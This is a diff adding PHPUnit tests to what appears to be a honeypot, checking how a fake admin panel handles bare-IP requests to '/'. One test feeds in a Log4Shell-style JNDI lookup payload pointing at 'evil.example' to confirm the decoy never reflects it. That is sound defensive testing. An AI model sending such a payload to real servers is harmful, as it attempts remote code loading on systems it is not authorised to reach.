@@ -239,4 +239,58 @@ final class PanelPrecedenceTest extends TestCase
             self::assertNotSame('panel', $r['event'] ?? '', 'an attack on a panel path must not be relabelled panel');
         }
     }
+
+    public function test_bare_ip_root_lands_in_admin_panel_logged_at_real_path(): void
+    {
+        // FP-0049: a bare-IP (no Host) hit on `/` drops into the fake admin panel — rendered as /admin but
+        // LOGGED at the real path `/` (Finding 2: the stored path must be `/`, never a fabricated `/admin`).
+        $store = new SqliteHitStore($this->tmpPath('hits') . '.sqlite');
+        $c = $this->controller($store);
+
+        ob_start();
+        @$c->handle(new RequestContext('GET', '/', '', ['User-Agent' => 'curl/8.0']), '9.9.9.9', 'off'); // host defaults to '' (bare)
+        ob_end_clean();
+
+        $rows = $this->rowsFor($store, '/');
+        $panel = array_values(array_filter($rows, static fn (array $r): bool => ($r['event'] ?? '') === 'panel'));
+        self::assertNotEmpty($panel, 'bare-IP / must land in the panel');
+        self::assertSame('/', $panel[0]['path'], 'logged at the REAL path /, not a fabricated /admin');
+        self::assertSame(['panel'], $panel[0]['templates'] ?? null);
+        // Exactly one panel row (no double-log).
+        self::assertCount(1, $panel);
+    }
+
+    public function test_named_host_root_is_not_panel(): void
+    {
+        // A real hostname never matches isBareIpHost, so `/` under a named host is NOT the admin panel
+        // (LE/SNI split untouched).
+        $store = new SqliteHitStore($this->tmpPath('hits') . '.sqlite');
+        $c = $this->controller($store);
+
+        ob_start();
+        @$c->handle(new RequestContext(method: 'GET', path: '/', host: 'admin.metrictower.com', headers: ['User-Agent' => 'curl/8.0']), '9.9.9.9', 'off');
+        ob_end_clean();
+
+        foreach ($this->rowsFor($store, '/') as $r) {
+            self::assertNotSame('panel', $r['event'] ?? '', 'a named-host / must not be the admin panel');
+        }
+    }
+
+    public function test_bare_ip_root_landing_never_reflects_the_payload(): void
+    {
+        // The bare-IP landing carries the same `!attack-tagged` don't-hijack guard as the mount branch
+        // (proven by test_genuine_attack_...) PLUS an AttackClassifier guard, so an attack the engine flags
+        // on `/` yields to the engine. The engine does not flag a query-payload on bare `/`, so such a probe
+        // lands in the panel — which must be INERT: the deterministic admin chrome never reflects the
+        // attacker's query (no execution, no reflection tell). That inertness is the invariant under test.
+        $store = new SqliteHitStore($this->tmpPath('hits') . '.sqlite');
+        $c = $this->controller($store);
+
+        ob_start();
+        @$c->handle(new RequestContext('GET', '/', 'x=${jndi:ldap://evil.example/a}', ['User-Agent' => 'curl/8.0']), '9.9.9.9', 'off');
+        $out = (string) ob_get_clean();
+
+        self::assertStringNotContainsString('${jndi', $out, 'the landing must not reflect the attacker payload');
+        self::assertStringNotContainsString('evil.example', $out);
+    }
 }
